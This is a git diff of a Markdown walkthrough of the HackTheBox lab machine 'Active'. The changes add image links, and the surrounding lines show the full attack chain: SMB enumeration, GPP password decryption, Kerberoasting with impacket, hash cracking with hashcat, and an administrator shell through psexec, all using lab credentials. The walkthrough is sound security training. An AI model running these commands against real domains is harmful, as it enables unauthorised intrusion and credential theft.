@@ -1,5 +1,5 @@
 # Active [HTB](https://app.hackthebox.com/machines/148)
-![active-01]()
+![active-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/active-01.png)
 
 
 ## Recon
@@ -10,7 +10,7 @@ After adding the target to my `/etc/hosts` file I start scanning for open ports:
 nmap -p- --min-rate 10000 active.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/ports-02.png)
 
 
 There were also rpc related ports at the buttom, but the above ports are the most relevant. Let's run a version detection scan on them:
@@ -19,9 +19,9 @@ There were also rpc related ports at the buttom, but the above ports are the mos
 nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389 -sCV active.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/nmap-res-03.png)
 
-![nmap-res-04]()
+![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/nmap-res-04.png)
 
 
 We have the following:
@@ -60,7 +60,7 @@ This works, and we get a connection, but trying to enumerate the domain with com
 
 Then I ran different tools like `crackmapexec` and `ldapsearch` as well as `enum4linux`. They didn't bring super useful results but `enum4linux -a active.htb` did manage to map the SMB shares on the target:
 
-![smb-shares-05]()
+![smb-shares-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/smb-shares-05.png)
 
 
 The available shares are highlighed in red at the top. Out of all the shares we can connect and list the contents of the `Replication` share.
@@ -76,12 +76,12 @@ smb: \> recurse
 smb: \> mget active.htb
 ```
 
-![mget-06]()
+![mget-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/mget-06.png)
 
 
 If we list the contents of this directory with `tree active.htb` we can see the following:
 
-![tree-07]()
+![tree-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/tree-07.png)
 
 
 Looks like we have two group policy objects in here, let's take a look at the files. 
@@ -118,7 +118,7 @@ We can try to decrypt the password on our Kali machine as such:
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 ```
 
-![decrypt-08]()
+![decrypt-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/decrypt-08.png)
 
 
 The password for the service account is `GPPstillStandingStrong2k18`, and now we have credentials to work with. This opens up a lot of active directory specific attacks, like [kerberosting](https://www.sentinelone.com/cybersecurity-101/what-is-kerberoasting-attack/). 
@@ -130,7 +130,7 @@ To find kerberostable user accounts we can use the recently found credentials wi
 impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip active.htb -request
 ```
 
-![kerberoast-09]()
+![kerberoast-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/kerberoast-09.png)
 
 
 Which results in the Administrator's account no less!  
@@ -142,7 +142,7 @@ Let's save the entire thing to a file and try to crack it with `hashcat` as such
 hashcat -m 13100 admin.hash rockyou.txt
 ```
 
-![cracked-10]()
+![cracked-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/cracked-10.png)
 
 
 I use my host GPU for the computation, which cracks after one second to `Ticketmaster1968`, from here I immediately go for psexec to give myself a shell as NT_Authority on this box:
@@ -151,4 +151,4 @@ I use my host GPU for the computation, which cracks after one second to `Ticketm
 impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
 ```
 
-![root-11]()
+![root-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Active/img/root-11.png)
